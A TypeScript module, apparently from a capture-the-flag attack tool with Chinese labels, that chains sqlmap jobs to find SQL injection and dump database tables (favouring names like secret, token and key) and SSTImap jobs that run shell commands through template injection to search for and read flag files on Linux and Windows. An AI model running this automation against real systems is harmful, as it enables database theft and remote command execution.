import type { StructuredFinding } from "../state/taskStore";
import { applySuggestionPatch } from "./suggestionEngine";
import type { ToolParameters } from "./commandBuilder";
import { stableIdPart } from "./stableIdentifier";

export interface AutomationJob {
  id: string;
  label: string;
  parameters: ToolParameters;
}

export interface AutomationPlanningOptions {
  maxSqlmapDumps?: number;
}

const DEFAULT_MAX_SQLMAP_DUMPS = 10;

function values(findings: StructuredFinding[], kind: string, context: { database?: string } = {}) {
  return Array.from(new Set(findings
    .filter((finding) => finding.kind === kind)
    .filter((finding) => !context.database || finding.database === context.database)
    .map((finding) => finding.value.trim())
    .filter(Boolean)));
}

function sqlParameters(base: ToolParameters, patch: ToolParameters): ToolParameters {
  return {
    ...applySuggestionPatch("sqlmap", base, patch),
    batch: true,
    threads: String(base.threads || "5"),
  };
}

function tablePriority(table: string) {
  return /flag|secret|token|key|config|message|content|data/i.test(table) ? 0 : 1;
}

function positiveInteger(value: number | undefined, fallback: number) {
  return Number.isFinite(value) && value && value > 0 ? Math.floor(value) : fallback;
}

function buildSqlmapJobs(
  parameters: ToolParameters,
  findings: StructuredFinding[],
  options: AutomationPlanningOptions,
): AutomationJob[] {
  const selectedDatabase = String(parameters.database ?? "").trim();
  const selectedTable = String(parameters.table ?? "").trim();
  const jobs: AutomationJob[] = [];
  if (!selectedDatabase) {
    jobs.push({
      id: "sqlmap-detect",
      label: "探测注入并枚举数据库",
      parameters: sqlParameters(parameters, { dbs: true }),
    });
  }

  const databases = selectedDatabase
    ? [selectedDatabase]
    : values(findings, "database").sort((left, right) => left.localeCompare(right));
  if (!selectedTable) {
    for (const database of databases) {
      jobs.push({
        id: `sqlmap-tables-${stableIdPart(database)}`,
        label: `枚举 ${database} 的数据表`,
        parameters: sqlParameters(parameters, { database, tables: true }),
      });
    }
  }

  const tables = selectedTable
    ? [{ value: selectedTable, database: selectedDatabase }]
    : findings
      .filter((finding) => finding.kind === "table" && finding.database)
      .map((finding) => ({ value: finding.value.trim(), database: finding.database ?? "" }))
      .filter((item) => !selectedDatabase || item.database === selectedDatabase)
      .filter((item) => item.value && item.database);
  const uniqueTables = Array.from(new Map(tables.map((item) => [`${item.database}\u0000${item.value}`, item])).values())
    .sort((left, right) => tablePriority(left.value) - tablePriority(right.value) || left.value.localeCompare(right.value))
    .slice(0, positiveInteger(options.maxSqlmapDumps, DEFAULT_MAX_SQLMAP_DUMPS));
  for (const { database, value: table } of uniqueTables) {
    jobs.push({
      id: `sqlmap-dump-${stableIdPart(database)}-${stableIdPart(table)}`,
      label: `导出 ${database}.${table}`,
      parameters: sqlParameters(parameters, { database, table, dump: true }),
    });
  }
  return jobs;
}

function shellPattern(prefixes: readonly string[]) {
  const accepted = prefixes
    .map((prefix) => prefix.trim())
    .filter((prefix) => /^[A-Za-z0-9_-]{1,32}$/.test(prefix));
  return (accepted.length ? accepted : ["flag", "CTF"]).map((prefix) => `${prefix}\\{`).join("|");
}

function sstimapParameters(base: ToolParameters, patch: ToolParameters): ToolParameters {
  return { ...applySuggestionPatch("sstimap", base, patch), noColor: true };
}

function hasShellCapability(findings: StructuredFinding[]) {
  return findings.some((finding) => finding.kind === "capability" && /shell command|命令执行/i.test(finding.value));
}

function windowsSearchCommands(pattern: string) {
  const roots = "@('C:\\inetpub\\wwwroot','C:\\Users','C:\\Temp')";
  return [
    `powershell.exe -NoProfile -NonInteractive -Command "$roots = ${roots}; Get-ChildItem -Path $roots -Recurse -File -ErrorAction SilentlyContinue | Select-String -Pattern '${pattern}' | Select-Object -First 200"`,
    `powershell.exe -NoProfile -NonInteractive -Command "$roots = ${roots}; Get-ChildItem -Path $roots -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'flag|ctf' } | Select-Object -First 200 -ExpandProperty FullName"`,
    "powershell.exe -NoProfile -NonInteractive -Command \"$paths = @('C:\\flag','C:\\flag.txt','C:\\inetpub\\wwwroot\\flag.txt','C:\\ctf\\flag.txt'); foreach ($path in $paths) { if (Test-Path -LiteralPath $path -PathType Leaf) { Write-Output ('=== ' + $path + ' ==='); Get-Content -LiteralPath $path -Raw } }\"",
  ];
}

function posixSearchCommands(pattern: string) {
  return [
    `grep -R -I -n -E '${pattern}' /app /var/www /home /tmp 2>/dev/null | head -n 200`,
    "find /app /var/www /home /tmp -type f \\( -iname '*flag*' -o -iname '*ctf*' \\) -print 2>/dev/null | head -n 200",
    "for f in /flag /flag.txt /app/flag /app/flag.txt /var/www/html/flag*; do [ -f \"$f\" ] && { echo \"=== $f ===\"; cat \"$f\"; }; done",
  ];
}

function buildSstimapJobs(parameters: ToolParameters, findings: StructuredFinding[], prefixes: readonly string[]): AutomationJob[] {
  const jobs: AutomationJob[] = [{
    id: "sstimap-detect",
    label: "探测模板注入与执行能力",
    parameters: sstimapParameters(parameters, {}),
  }];
  const engine = values(findings, "engine")[0];
  const technique = values(findings, "technique")[0];
  if (!engine || !technique || !hasShellCapability(findings)) return jobs;
  const pattern = shellPattern(prefixes);
  const shared = { engine, technique };
  const targetOs = values(findings, "os")[0] ?? "";
  const [searchContent, searchFiles, searchCommonPaths] = /^win/i.test(targetOs)
    ? windowsSearchCommands(pattern)
    : posixSearchCommands(pattern);
  jobs.push(
    {
      id: "sstimap-search-content",
      label: "检索可提交内容",
      parameters: sstimapParameters(parameters, { ...shared, osCommand: searchContent }),
    },
    {
      id: "sstimap-search-files",
      label: "查找 Flag 文件",
      parameters: sstimapParameters(parameters, { ...shared, osCommand: searchFiles }),
    },
    {
      id: "sstimap-search-common-paths",
      label: "读取常见 Flag 路径",
      parameters: sstimapParameters(parameters, { ...shared, osCommand: searchCommonPaths }),
    },
  );
  return jobs;
}

export function buildAutomationJobs(
  toolId: string,
  parameters: ToolParameters,
  findings: StructuredFinding[],
  prefixes: readonly string[],
  options: AutomationPlanningOptions = {},
): AutomationJob[] {
  if (toolId === "sqlmap") return buildSqlmapJobs(parameters, findings, options);
  if (toolId === "sstimap") return buildSstimapJobs(parameters, findings, prefixes);
  return [];
}
